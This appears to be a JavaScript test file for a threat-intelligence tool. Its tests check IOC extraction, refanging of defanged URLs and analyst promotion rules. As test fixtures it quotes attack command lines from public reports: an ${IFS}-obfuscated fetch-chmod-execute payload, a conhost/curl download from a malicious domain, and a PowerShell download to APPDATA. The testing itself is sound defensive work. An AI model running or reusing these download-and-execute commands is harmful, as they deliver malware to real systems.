/**
 * Thirty-two-report coverage-gap regressions, reports 34415–34446
 * (tl-candidates-v45 / tl-defang-v6). Full-document audit of the batch after
 * finalization: publisher-described observables that were stored with a wrong
 * identity, never tokenized, or could not be recovered by an analyst.
 *
 * G1. A shell separator glued to a URL on a command line ends the URL:
 *     "fetch${IFS}-o … http://h/kw2-s11;chmod${IFS}+x" (34416) and
 *     "curl -skLo t https://h/d&pushd C:\…" (34434). Query separators
 *     ("?a=1&b=2") and valued path parameters (";jsessionid=…") stay.
 * G2. A URL written as an escaped script string ("hXXps:\/\/host/x", 34426)
 *     refangs to a URL.
 * G3. A table-listed URL carrying a glued YubiKey OTP resolves to the URL the
 *     same document writes without it (34438); the raw cell stays in the
 *     evidence. Without corroboration the value stays as written.
 * G4. An analyst may confirm (promote_to_ioc) a MODE A narrative value the
 *     publisher did not call benign / provider / reference; the confirmed row is
 *     a report Indicator, a pending or Context Only row is not.
 *
 * Values are public IOCs from the audited reports or documentation shapes.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { extractCanonicalDocumentFromHtml } from './extract/extractHtml.js';
import { extractReportCandidates } from './extractionStages.js';
import { buildCandidateEvidenceRecord } from './evidencePolicy.js';
import { isReportIndicatorMember, isAnalystConfirmedPublisherEvidence } from './indicatorMembership.js';
import { asPromotedRow, classifyPromoteEligibility, previewCreateIocPromotion } from './promotion.js';
import { THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION } from './candidateExtraction.js';
import { refangTextForExtraction } from './defang.js';

process.env.THREAT_LIBRARY_SCOPE_ENGINE = 'section_tree';

const SOURCE = 'https://vendor-research.example/blog/thirty-two-report-coverage/';

function doc(inner) {
  const html = `<!doctype html><html lang="en"><head><title>Audit</title></head><body><article>
<h1>Campaign analysis</h1>
<p>Background paragraph describing the intrusion set and its tooling across several environments.</p>
${inner}
</article></body></html>`;
  const r = extractCanonicalDocumentFromHtml(html, { url: SOURCE, finalUrl: SOURCE, httpStatus: 200 });
  assert.equal(r.ok, true);
  return r.document;
}
const run = (inner) => extractReportCandidates({ source_type: 'url', source_url: SOURCE }, doc(inner));
const persisted = (c, patch = {}) => ({ ...c, has_original_document_occurrence: true, review_status: 'pending', evidence: buildCandidateEvidenceRecord(c), ...patch });
const values = (out) => out.candidates.map((c) => String(c.normalized_value));
const find = (out, value) => out.candidates.find((c) => String(c.normalized_value).toLowerCase() === value.toLowerCase());
const member = (out, value) => {
  const c = find(out, value);
  return Boolean(c) && isReportIndicatorMember(persisted(c));
};

const IOC_TABLE = `<h2>Indicators Of Compromise (IOCs)</h2>
<table><thead><tr><th>Indicator</th><th>Type</th></tr></thead><tbody>
<tr><td>45.244.42[.]195</td><td>IP</td></tr>
</tbody></table>`;

test('versions: tl-candidates-v45', () => {
  assert.equal(THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION, 'tl-candidates-v45');
});

// --- G1. Shell separators ----------------------------------------------------

test('G1: a shell separator glued to a URL on a command line ends the URL (34416, 34434)', () => {
  const out = run(`<h2>Exploitation payloads</h2>
<pre><code>NSPPE;fetch\${IFS}-o\${IFS}/var/kw2s11\${IFS}http://209.141.43[.]95/files/kw2-freebsd-x64-s11;chmod\${IFS}+x\${IFS}/var/kw2s11;/var/kw2s11;#</code></pre>
<pre><code>conhost.exe --headless cmd /c "md C:\\x&amp;curl -skLo C:\\x\\t https://rs2y15sungu[.]com/d&amp;pushd C:\\x"</code></pre>
${IOC_TABLE}`);
  const v = values(out);
  assert.ok(v.includes('http://209.141.43.95/files/kw2-freebsd-x64-s11'), v.join(' | '));
  assert.ok(!v.some((x) => x.includes(';chmod')), 'no shell command in the URL identity');
  assert.ok(v.includes('https://rs2y15sungu.com/d'), v.join(' | '));
  assert.ok(!v.some((x) => x.includes('&pushd')));
});

test('G1 control: query separators and valued path parameters are URL syntax', () => {
  const out = run(`<h2>Delivery</h2>
<p>The loader requests https://cdn-files[.]example/get?id=7&amp;mode=raw and then https://cdn-files[.]example/app/index.jsp;jsessionid=AB12 for tasks.</p>
${IOC_TABLE}`);
  const v = values(out);
  assert.ok(v.includes('https://cdn-files.example/get?id=7&mode=raw'), v.join(' | '));
  assert.ok(v.some((x) => x.startsWith('https://cdn-files.example/app/index.jsp;jsessionid=')), v.join(' | '));
});

// --- G2. Escaped-slash URL literal --------------------------------------------

test('G2: an escaped-slash URL literal in a script refangs (34426)', () => {
  assert.equal(
    refangTextForExtraction('$u="hXXps:\\/\\/re102.fastwinnow.com/download/link";$p="x"'),
    '$u="https://re102.fastwinnow.com/download/link";$p="x"'
  );
  assert.equal(refangTextForExtraction('"https:\\/\\/cdn.example\\/a\\/b.js"'), '"https://cdn.example/a/b.js"');
  const out = run(`<h2>Payload</h2>
<pre><code>$l=RANDOM;$u="hXXps:\\/\\/re102.fastwinnow.com/download/link";$p="$env:APPDATA\\sekv$l.exe";Invoke-WebRequest $u -OutFile $p</code></pre>
${IOC_TABLE}`);
  assert.ok(values(out).includes('https://re102.fastwinnow.com/download/link'), values(out).join(' | '));
});

test('G2 control: an escaped slash outside a scheme is left alone', () => {
  assert.equal(refangTextForExtraction('path C:\\/temp\\/x and ratio 1\\/2'), 'path C:\\/temp\\/x and ratio 1\\/2');
});

// --- G3. Glued YubiKey OTP ------------------------------------------------------

const OTP = 'cccccdcjeegrekhllfijllutvbrrcifehuenfirtelit';
const DRIVE = 'drive.google.com/uc?id=1TVJir-OlNZrLjm5FyBMk_hDjG9BV1zCy&export=download';

test('G3: a table URL with a glued YubiKey OTP resolves to the corroborated URL (34438)', () => {
  const out = run(`<h2>Loader</h2>
<pre><code>curl.exe -L 'https://${DRIVE.replace('google.com', 'google[.]com')}' -o 'C:\\Windows\\Temp\\FileR.txt'</code></pre>
<h2>Indicators Of Compromise (IOCs)</h2>
<table><thead><tr><th>Indicator</th><th>Type</th></tr></thead><tbody>
<tr><td>E4B594A18FC2A6EE164A76BDEA980BC0</td><td>VBS</td></tr>
<tr><td>${DRIVE.replace('google.com', 'google[.]com')}${OTP}</td><td>TXT download</td></tr>
</tbody></table>`);
  const v = values(out);
  assert.ok(!v.some((x) => x.endsWith(OTP)), 'the OTP-suffixed identity is gone');
  const clean = find(out, `https://${DRIVE}`);
  assert.ok(clean, v.join(' | '));
  assert.equal(member(out, `https://${DRIVE}`), true, 'the publisher row asserts the resolved URL');
  const ev = buildCandidateEvidenceRecord(clean);
  assert.ok(String(ev.value_artifact_resolved_from || '').endsWith(OTP), 'publisher spelling kept');
  assert.ok((ev.table_rows || []).some((r) => String(r.raw_value || r.indicator_cell || '').includes(OTP)), 'raw cell kept');
  assert.ok((ev.occurrences || []).some((o) => o.value_artifact === 'modhex_otp_suffix'));
  const missing = [...JSON.stringify(out.diagnostics || {}).matchAll(/"missing_identities":(\[[^\]]*\])/g)].map((m) => m[1]);
  assert.ok(missing.length > 0, 'completeness diagnostics present');
  assert.ok(missing.every((list) => !list.includes(OTP)), 'the resolved row is not reported as a lost table identity');
});

test('G3 control: without corroboration, or without an OTP shape, the table value stays as written', () => {
  const uncorroborated = run(`<h2>Indicators Of Compromise (IOCs)</h2>
<table><thead><tr><th>Indicator</th><th>Type</th></tr></thead><tbody>
<tr><td>${DRIVE.replace('google.com', 'google[.]com')}${OTP}</td><td>TXT download</td></tr>
</tbody></table>`);
  assert.ok(values(uncorroborated).some((x) => x.endsWith(OTP)), 'nothing to resolve against');
  const plain = run(`<h2>Loader</h2>
<p>The stager fetches https://files-cdn[.]example/drop/a and https://files-cdn[.]example/drop/abcdef.</p>
<h2>Indicators Of Compromise (IOCs)</h2>
<table><thead><tr><th>Indicator</th><th>Type</th></tr></thead><tbody>
<tr><td>hxxps://files-cdn[.]example/drop/abcdef</td><td>URL</td></tr>
</tbody></table>`);
  assert.equal(member(plain, 'https://files-cdn.example/drop/abcdef'), true);
});

// --- G4. Analyst confirmation of a MODE A narrative value -----------------------

test('G4: a promoted MODE A narrative value is an Indicator only while approved', () => {
  const out = run(`<h2>Infrastructure overlap</h2>
<p>We observed attempts by the threat actor to ping ssl.blsouqs[.]com (C2 server of the OctLurk backdoor).</p>
${IOC_TABLE}`);
  const c = find(out, 'ssl.blsouqs.com');
  assert.ok(c);
  const row = persisted(c);
  assert.equal(isReportIndicatorMember(row), false, 'outside the curated IOC set: not automatic');
  const pending = classifyPromoteEligibility({ ...row, assessment: 'context_only', match_state: 'context_only' });
  assert.equal(pending.promotable, true, JSON.stringify(pending));
  assert.equal(pending.requires_corroboration, true);
  assert.equal(pending.ok, false);
  const confirmedDecision = classifyPromoteEligibility(
    { ...row, assessment: 'context_only', match_state: 'context_only' },
    { corroboration: 'The narrative names this host as the OctLurk C2 server.' }
  );
  assert.equal(confirmedDecision.ok, true);
  const confirmed = { ...row, review_status: 'approved', assessment: 'suspicious', evidence: { ...row.evidence, promoted_from: { review_status: 'pending' } } };
  assert.equal(isAnalystConfirmedPublisherEvidence(confirmed), true);
  assert.equal(isReportIndicatorMember(confirmed), true);
  assert.equal(isReportIndicatorMember({ ...confirmed, review_status: 'pending' }), false);
  // The in-memory shape a refresh produces (promoted_from at the top level) agrees.
  assert.equal(isReportIndicatorMember({ ...row, review_status: 'approved', assessment: 'suspicious', promoted_from: { review_status: 'pending' } }), true);
  // The promote dry-run previews the row promotion would create, not a non-member.
  const preview = previewCreateIocPromotion([asPromotedRow({ ...row, assessment: 'context_only', match_state: 'context_only' })]);
  assert.equal(preview.summary.eligible, 1, JSON.stringify(preview.results));
  assert.equal(isReportIndicatorMember({ ...confirmed, review_status: 'context_only', assessment: 'context_only' }), false);
});

test('G4: a malicious-assessed MODE A narrative value (not Context Only, not an IOC candidate) is confirmable', () => {
  const out = run(`<h2>Infrastructure overlap</h2>
<p>This is the same SSL certificate shared by the C2 domain about.blsouqs[.]com used by the OctLurk backdoor.</p>
${IOC_TABLE}`);
  const c = find(out, 'about.blsouqs.com');
  assert.ok(c);
  const row = persisted(c, { assessment: 'malicious', match_state: 'new' });
  assert.equal(isReportIndicatorMember(row), false, 'Approve cannot reach it');
  const elig = classifyPromoteEligibility(row);
  assert.equal(elig.promotable, true, JSON.stringify(elig));
  assert.equal(elig.requires_corroboration, true);
  assert.equal(classifyPromoteEligibility(row, { corroboration: 'The narrative names this domain as the OctLurk C2.' }).ok, true);
  // An Indicator the publisher asserted is still approved, never promoted.
  const listed = find(out, '45.244.42.195');
  assert.equal(classifyPromoteEligibility(persisted(listed)).code, 'promote_not_context_only');
});

test('G4 control: a value the publisher called a legitimate service is never confirmable', () => {
  const out = run(`<h2>Discovery</h2>
<p>The stealer queries legitimate public services such as https://ipinfo[.]io/country to read the victim location.</p>
${IOC_TABLE}`);
  const c = find(out, 'https://ipinfo.io/country');
  assert.ok(c);
  const row = persisted(c, { assessment: 'context_only', match_state: 'context_only' });
  const elig = classifyPromoteEligibility(row);
  assert.equal(elig.ok, false, JSON.stringify(row.evidence.policy_decision));
  assert.equal(elig.promotable, false);
  assert.equal(classifyPromoteEligibility(row, { corroboration: 'I want this service domain in the IOC set anyway.' }).ok, false);
});
